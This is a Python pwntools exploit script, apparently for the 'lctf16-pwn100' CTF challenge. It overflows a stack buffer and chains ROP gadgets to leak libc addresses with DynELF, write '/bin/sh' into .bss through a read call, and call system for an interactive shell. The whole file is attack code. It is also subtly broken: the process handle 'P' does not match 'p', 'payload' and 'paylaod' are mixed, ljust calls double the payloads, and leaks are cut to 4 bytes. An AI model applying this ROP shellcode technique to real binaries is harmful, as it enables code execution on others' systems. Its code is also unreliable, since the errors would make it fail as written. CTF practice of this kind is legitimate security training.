from pwn import *

# context.log_level = 'debug'

P = process('./lctf16-pwn100')
elf = ELF('./lctf16-pwn100')

read_plt = elf.plt['read']
read_got = elf.got['read']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi = 0x0000000000400763
pop6_ret = 0x000000000040075a
bss_addr =0x0000000000601050
start_addr = 0x0000000000400550
func_addr = 0x000000000040063D
main_addr = 0x00000000004006B8
init2_addr = 0x0000000000400740
pad = 'A'*72

def leak(addr):
    data = ''
    payload = pad
    paylaod += p64(pop_rdi)+p64(addr)+p64(puts_plt)
    paylaod += p64(start_addr)
    paylaod += paylaod.ljust(200,'B')
    p.send(paylaod)
    print p.recvuntil('bye~\n')
    up = ''
    while True:
        c = p.recv(numb = 1,timeout = 0.5)
        if up == '\n' and c == '':
            data = data[:-1]
            data += '\x00'
            break
        else:
            data += c
        up = c
    data = data[:4]
    return data
d = DynELF(leak,elf=ELF('./lctf16-pwn100'))
system_addr = d.lookup('system','libc')

paylaod1 = pad
paylaod1 += p64(pop6_ret)+p64(0)+p64(1)+p64(read_got)+p64(8)+p64(bss_addr)+p64(0)
paylaod1 += p64(init2_addr)+'A'*56+p64(start_addr)
paylaod1 += paylaod1.ljust(200,'C')
p.send(paylaod1)
print p.recvuntil('bye~\n')
p.send('/bin/sh\x00')

print '-----------get shell--------------'

paylaod2 = pad
paylaod2 += p64(pop_rdi)+p64(bss_addr)
paylaod2 += p64(system_addr)
paylaod2 += p64(start_addr)
paylaod2 = paylaod2.ljust(200,'D')

p.send(paylaod2)
p.interactive()